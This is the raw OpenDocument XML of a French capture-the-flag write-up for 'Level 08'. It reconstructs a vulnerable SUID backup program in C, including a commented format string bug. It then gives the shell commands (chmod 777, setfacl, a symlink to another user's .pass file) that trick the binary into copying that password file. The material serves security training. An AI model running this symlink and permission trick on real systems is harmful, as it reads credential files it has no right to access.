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2DB000007A7FE559B8E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000467E00002198339C9136.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000024CC000007C12CCD6DB4.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003D4B000021B22591B4D9.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001EB300001E2F0985CB2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paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#6ab825" style:text-underline-style="none" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt"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784202426091406053" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Level 08</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P7">#include &lt;fcntl.h&gt;</text:p>
      <text:p text:style-name="P7">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P7">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P7">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T4">log_wrapper</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">FILE</text:span> <text:span text:style-name="T6">*file,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*msg,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*path)</text:span></text:p>
      <text:p text:style-name="P9">{</text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/></text:span><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T9">254</text:span><text:span text:style-name="T6">];</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">len</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">rmd</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">strcpy(buff,</text:span> <text:span text:style-name="T6">msg);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(buff[len])</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">len++;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">rmd</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">254</text:span> <text:span text:style-name="T6">-</text:span> <text:span text:style-name="T6">len;</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">snprintf(buff+len,</text:span> <text:span text:style-name="T6">rmd,</text:span> <text:span text:style-name="T6">path);</text:span> <text:s text:c="11"/><text:span text:style-name="T8">// Format string vulnerability</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">buff[strcspn(buff,</text:span> <text:span text:style-name="T10">"\n"</text:span><text:span text:style-name="T6">)]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">fprintf(file,</text:span> <text:span text:style-name="T10">"LOG: %s\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">buff);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9">}</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">main</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">**argv)</text:span></text:p>
      <text:p text:style-name="P9">{</text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">FILE<text:tab/></text:span><text:span text:style-name="T6">*file;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">FILE<text:tab/></text:span><text:span text:style-name="T6">*log;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/></text:span><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T9">100</text:span><text:span text:style-name="T6">];</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/></text:span><text:span text:style-name="T6">c</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">fd;</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(argc</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T9">2</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"Usage: %s filename\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">argv[</text:span><text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">log</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">fopen(</text:span><text:span text:style-name="T10">"./backups/.log"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"w"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(log</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"ERROR: Failed to open %s\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"./backups/.log"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">log_wrapper(log,</text:span> <text:span text:style-name="T10">"Starting back up: "</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">argv[</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">file</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">fopen(argv[</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">],</text:span> <text:span text:style-name="T10">"r"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(file</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"ERROR: Failed to open %s\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">argv[</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P8"><text:soft-page-break/></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T6">*pre</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T10">"./backups/"</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(pre[i])</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">buff[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">pre[i];</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">buff[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">i--;</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">rmd</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">100</text:span> <text:span text:style-name="T6">-</text:span> <text:span text:style-name="T6">i;</text:span> <text:s text:c="3"/></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">strncat(buff,</text:span> <text:span text:style-name="T6">argv[i],</text:span> <text:span text:style-name="T6">rmd);</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">fd</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">open(buff,</text:span> <text:span text:style-name="T6">O_CREAT</text:span> <text:span text:style-name="T6">|</text:span> <text:span text:style-name="T6">O_EXCL</text:span> <text:span text:style-name="T6">|</text:span> <text:span text:style-name="T6">O_WRONLY,</text:span> <text:span text:style-name="T6">S_IRUSR</text:span> <text:span text:style-name="T6">|</text:span> <text:span text:style-name="T6">S_IWUSR</text:span> <text:span text:style-name="T6">|</text:span> <text:span text:style-name="T6">S_IRGRP</text:span> <text:span text:style-name="T6">|</text:span> <text:span text:style-name="T6">S_IWGRP);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(fd</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T10">"ERROR: Failed to open %s%s\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T10">"./backups/"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">argv[</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(c</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T6">EOF)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T6">c</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">fgetc(file);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(c</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T9">0xff</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="12"/><text:span text:style-name="T6">write(fd,</text:span> <text:span text:style-name="T6">&amp;c,</text:span> <text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">log_wrapper(log,</text:span> <text:span text:style-name="T10">"Finished back up "</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">argv[</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">fclose(file);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T6">close(fd);</text:span></text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T9">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P5">}</text:p>
      <text:p text:style-name="P3">On est sur un binaire <text:span text:style-name="T3">x64</text:span><text:span text:style-name="T11">. Il n'y avait rien de particulièrement compliqué dans la reconstitution du code source. On note dans le répertoire </text:span><text:span text:style-name="T3">home </text:span><text:span text:style-name="T11">de l'utilisateur actuel un dossier </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T11"> qui appartient à </text:span><text:span text:style-name="T3">level09 </text:span><text:span text:style-name="T11">(level suivant), avec un seul fichier vide, </text:span><text:span text:style-name="T3">.log</text:span><text:span text:style-name="T11"> :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="1.686cm" svg:y="0.143cm" svg:width="13.624cm" svg:height="7.489cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700003D4B000021B22591B4D9.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Le programme fonctionne de la façon suivante :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On ouvre le fichier </text:span><text:span text:style-name="T12">./backups/.log</text:span><text:span text:style-name="T11"> (en écriture) et on y inscrit un message indiquant qu'on démarre l'action de log, grâce à la fonction </text:span><text:span text:style-name="T3">log_wrapper</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On ouvre le fichier </text:span><text:span text:style-name="T12">&lt;filepath&gt;</text:span><text:span text:style-name="T11"> précisé dans le premier argument du programme (en lecture). Appelons-le </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On ouvre le fichier </text:span><text:span text:style-name="T12">./backup/&lt;filepath&gt;</text:span><text:span text:style-name="T11"> (en écriture, avec les droits de lecture et d'écriture pour le propriétaire </text:span><text:span text:style-name="T3">et tous les utilisateurs du groupe users. Si le fichier existe déjà, on renvoie une erreur</text:span><text:span text:style-name="T11">). Appelons ce fichier </text:span><text:span text:style-name="T3">fd</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On écrit le contenu du fichier </text:span><text:span text:style-name="T12">&lt;filepath&gt;</text:span><text:span text:style-name="T11"> dans </text:span><text:span text:style-name="T12">./backup/&lt;filepath&gt;</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On inscrit un message indiquant la fin de l'action de log dans </text:span><text:span text:style-name="T12">./backup/.log</text:span><text:span text:style-name="T11"> grâce à la fonction </text:span><text:span text:style-name="T3">log_wrapper</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Le premier instinct ici serait de leak le contenu du fichier /home/users/level09/.pass en faisant en sortes que le binaire l'ouvre et en inscrive le contenu dans le fichier d'output. Ce n'est cependant pas si simple, car imaginons qu'on donne au programme ce </text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T11"> :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">./level08 /home/users/level09/.pass</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Le programme n'aura aucun mal à ouvrire </text:span><text:span text:style-name="T3">file </text:span><text:span text:style-name="T11">(i.e. ce fichier) en lecture, car il est exécuté en tant que </text:span><text:span text:style-name="T3">level09</text:span><text:span text:style-name="T11">. Cependant, il va ensuite tenter d'ouvrir (en le créant s'il n'existe pas) le fichier </text:span><text:span text:style-name="T3">./backups//home/users/level09/.pass</text:span><text:span text:style-name="T11">. Il n'y arrivera pas car le dossier </text:span><text:span text:style-name="T3">/home/users/level09</text:span><text:span text:style-name="T11"> n'existe pas dans le dossier </text:span><text:span text:style-name="T3">/backups</text:span><text:span text:style-name="T11"> de notre dossier home actuel. On nous renverra une erreur et le programme s'arrêtera.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On pourrait essayer de bouger le binary (par exemple dans </text:span><text:span text:style-name="T3">/tmp</text:span><text:span text:style-name="T11">) et créer notre propre dossier </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T11"> avec les bons sous-dossiers, mais quand j'essayais de bouger le fichier binaire, l'ownership ne tenait pas et le fichier n'était plus SUID en plus d'appartenir à level08 (même avec les options de préservation de </text:span><text:span text:style-name="T3">cp </text:span><text:span text:style-name="T11">ou avec une action </text:span><text:span text:style-name="T3">mv</text:span><text:span text:style-name="T11">). Bref, il va nous falloir une autre stratégie à partir de notre dossier actuel. Le plan, de façon générale, est le suivant :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt;Exécuter la commande suivante :</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">./binary ../level08/lnk</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Pour le fichier d'input </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T11">, on revient d'un dossier en arrière puis on entre dans le dossier </text:span><text:span text:style-name="T3">level08</text:span><text:span text:style-name="T11"> ; en d'autre termes, on reste sur place, et on ouvre le fichier </text:span><text:span text:style-name="T3">lnk </text:span><text:span text:style-name="T11">qui s'avérera être un lien symbolique vers </text:span><text:span text:style-name="T12">/home/users/level09/.pass</text:span><text:span text:style-name="T11">. Du point de vue du fichier d'output </text:span><text:span text:style-name="T3">fd</text:span><text:span text:style-name="T11">, on tente d'ouvrir le fichier </text:span><text:span text:style-name="T12">./backups/../level08/lnk</text:span><text:span text:style-name="T11"> en écriture ; donc un fichier appartenant à un dossier </text:span><text:span text:style-name="T3">./level08</text:span><text:span text:style-name="T11"> à partir du dossier home de l'utilisateur, qu'on aura préalablement créé avec les bons droits. Bref :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images3" text:anchor-type="paragraph" svg:x="0.005cm" svg:y="0.344cm" svg:width="9.419cm" svg:height="1.984cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000024CC000007C12CCD6DB4.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T11">Tout cela fonctionnera : le lien symbolique sera ouvert correctement, de même que le fichier d'output qui correspondra à un fichier différent dont le dossier parent existe.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Pour créer la bonne configuration et que tout se déroule comme prévu, les étapes suivantes sont nécessaires :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; D'abord, effectuer un </text:span><text:span text:style-name="T3">chmod 777 </text:span><text:span text:style-name="T11">sur le dossier actuel qui nous appartient en tant qu'utilisateur </text:span><text:span text:style-name="T3">level08</text:span><text:span text:style-name="T11">, pour avoir un peu plus de latitude sur la création de sous-dossiers / fichiers :</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">chmod 777 .</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Renommons notre fichier binaire et créons un dossier </text:span><text:span text:style-name="T3">level08 </text:span><text:span text:style-name="T11">dans notre dossier home (qui s'appelle lui-même level08, mais peu importe) :</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">mv level08 binary</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">mkdir level08</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Il va falloir que l'utilisateur </text:span><text:span text:style-name="T3">level09 </text:span><text:span text:style-name="T11">puisse écrire dans notre dossier </text:span><text:span text:style-name="T12">./level08</text:span><text:span text:style-name="T11"> nouvellement créé, car c'est lui qui va recevoir le fichier d'ouput. On remarque que ce dossier a des </text:span><text:span text:style-name="T3">ACL étendus </text:span><text:span text:style-name="T11">(petit signe "+" à côté des permissions classiques). C'est normal, car notre dossier courant a défini des ACLs par défaut qui s'appliquent à tous les répertoires et fichiers créés dans ce dossier (</text:span><text:a xlink:type="simple" xlink:href="https://linux.goffinet.org/administration/securite-locale/access-control-lists-acls-linux/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T11">pour en savoir plus sur ces ACLs</text:span></text:a><text:span text:style-name="T11">). Les permissions, actuellement, sont les suivantes pour le dossier qu'on vient de créer :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:x="0.046cm" svg:y="0cm" svg:width="7.31cm" svg:height="7.188cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700001EB300001E2F0985CB27.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">L'utilisateur </text:span><text:span text:style-name="T3">level09 </text:span><text:span text:style-name="T11">n'a pas les droits d'écriture dans notre dossier ; on va les lui ajouter (on peut le faire car on est le owner de l'objet) :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">setfacl -m u:level09:rwx ./level08/</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; On crée le </text:span><text:span text:style-name="T3">symbolic link </text:span><text:span text:style-name="T11">à la racine de notre dossier home ; c'est lui que le fichier d'input va ouvrir :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">ln -s /home/users/level09/.pass lnk</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Exécuter le binaire renommé :</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">./binary ../level08/lnk</text:span></text:p>
